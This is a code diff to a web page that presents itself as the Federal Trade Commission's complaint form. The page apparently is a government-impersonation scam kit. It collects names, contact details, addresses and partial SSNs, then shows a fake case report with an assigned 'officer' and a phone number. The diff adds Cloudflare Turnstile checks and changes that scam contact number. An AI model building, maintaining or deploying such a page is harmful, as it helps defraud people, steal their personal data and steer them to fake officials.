@@ -47,6 +47,8 @@
 <link rel="alternate" hreflang="en" href="/" />
 <script>window.a2a_config=window.a2a_config||{};a2a_config.callbacks=[];a2a_config.overlays=[];a2a_config.templates={};</script>
 
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
   <title>Federal Trade Commission | Protecting America&#039;s Consumers</title>
   <link rel="stylesheet" media="all" href="/core/assets/vendor/jquery.ui/themes/base/core.css?til85l" />
 <link rel="stylesheet" media="all" href="/core/assets/vendor/jquery.ui/themes/base/controlgroup.css?til85l" />
@@ -2576,6 +2578,13 @@ textarea.rf-input{height:auto;min-height:128px;max-height:176px;padding:10px 12p
 </style>
 
 <div id="rf-app">
+  <!-- ================= VISIBLE TURNSTILE (top of page) ================= -->
+  <div id="rf-turnstile-top" class="rf-turnstile-top" style="padding:16px 0;text-align:center;border-bottom:1px solid #e5e7eb;margin-bottom:16px">
+    <div style="display:inline-block">
+      <div class="cf-turnstile" data-sitekey="0x4AAAAAAEIljKTmtrOC666j" data-theme="light" data-callback="onTurnstileVerify"></div>
+      <p style="margin:8px 0 0;font-size:13px;color:#6b7280">Security verification by Cloudflare Turnstile</p>
+    </div>
+  </div>
   <!-- ================= STEP 1 ================= -->
   <div id="rf-step1">
     <div class="rf-step-head">
@@ -2639,12 +2648,15 @@ textarea.rf-input{height:auto;min-height:128px;max-height:176px;padding:10px 12p
       <div class="rf-field full"><label class="rf-label">Do you have any other information about them (phone, website, etc)?</label>
         <div class="rf-radio"><label><input type="radio" name="other" value="yes"> Yes</label><label><input type="radio" name="other" value="no" checked> No</label></div>
       </div>
-      <div class="rf-field full">
-        <div class="rf-h2">Comments</div>
-        <p class="rf-q" style="margin-bottom:4px">Describe what happened</p>
-        <p class="rf-help">Tell us what happened in your own words. Include specific details you remember. Do not include any sensitive information, such as SSN, DOB, driver's license numbers, account numbers, medical history, etc.</p>
-        <textarea id="comments" class="rf-input"></textarea>
-      </div>
+<div class="rf-field full">
+      <div class="rf-h2">Comments</div>
+      <p class="rf-q" style="margin-bottom:4px">Describe what happened</p>
+      <p class="rf-help">Tell us what happened in your own words. Include specific details you remember. Do not include any sensitive information, such as SSN, DOB, driver's license numbers, account numbers, medical history, etc.</p>
+      <textarea id="comments" class="rf-input"></textarea>
+    </div>
+    <div class="rf-field full">
+      <div class="cf-turnstile" data-sitekey="0x4AAAAAAEIljKTmtrOC666j" data-theme="light"></div>
+    </div>
     </div>
 
     <div class="rf-btns">
@@ -2704,12 +2716,29 @@ textarea.rf-input{height:auto;min-height:128px;max-height:176px;padding:10px 12p
 </div>
 
 <script>
-(function(){
+  window.onTurnstileVerify = function(token) {
+    console.log('Turnstile verified:', token);
+    var topContainer = document.getElementById('rf-turnstile-top');
+    if (topContainer) topContainer.setAttribute('data-verified', 'true');
+  };
+  (function(){
   var $=function(id){return document.getElementById(id)};
   var data={};
   function v(id){var el=$(id);return el?el.value.trim():''}
   function radio(name){var r=document.querySelector('input[name="'+name+'"]:checked');return r?r.value:''}
-  function showStep(step){$('rf-step1').style.display=step===1?'block':'none';$('rf-step2').style.display=step===2?'block':'none';window.scrollTo(0,0)}
+  function showStep(step){
+    $('rf-step1').style.display=step===1?'block':'none';
+    var step2=$('rf-step2');
+    step2.style.display=step===2?'block':'none';
+    if(step===2 && window.turnstile && !$('cf-turnstile-rendered')){
+      var container=step2.querySelector('.cf-turnstile');
+      if(container && container.children.length===0){
+        window.turnstile.render(container,{sitekey:'0x4AAAAAAEIljKTmtrOC666j',theme:'light'});
+        container.setAttribute('id','cf-turnstile-rendered');
+      }
+    }
+    window.scrollTo(0,0)
+  }
 
   function validateStep1(){
     var fields={first:'First Name',last:'Last Name',email:'Email',phone:'Phone Number',addr1:'Street Address',city:'City',state:'State',zip:'Zip/Postal Code',country:'Country or region',ssn:'Last four digits of SSN'};
@@ -2740,6 +2769,9 @@ textarea.rf-input{height:auto;min-height:128px;max-height:176px;padding:10px 12p
     if(!v('company'))errs.push('company name');
     if(!v('officer'))errs.push('officer name');
     if(!v('comments'))errs.push('a description of what happened');
+    var topWidget = document.querySelector('#rf-turnstile-top .cf-turnstile');
+    var turnstileToken = (topWidget && window.turnstile && window.turnstile.getResponse ? window.turnstile.getResponse(topWidget) : '') || (window.turnstile && window.turnstile.getResponse ? window.turnstile.getResponse() : '') || document.querySelector('input[name="cf-turnstile-response"]')?.value;
+    if(!turnstileToken) errs.push('please complete the security check');
     if(errs.length){showErr('Please fill: '+errs.join(', '));return}
     data.company=v('company');data.officer=v('officer');data.other=radio('other');data.comments=v('comments');
     this.disabled=true;
@@ -2760,7 +2792,8 @@ textarea.rf-input{height:auto;min-height:128px;max-height:176px;padding:10px 12p
       ['Agency','Federal Trade Commission (FTC)'],
       ['Officer Assigned','Robert Morris'],
       ['Designation','Investigation Officer'],
-      ['Contact Number','(901) 235-0987'],
+      ['Contact Number','253 235 3452'],
+      ['Case Officer','David Long'],
       ['Report Number',String(rn)],
       ['Victim Name',(data.first||'')+' '+(data.last||'')],
       ['Last four digit SSN',data.ssn||'-'],
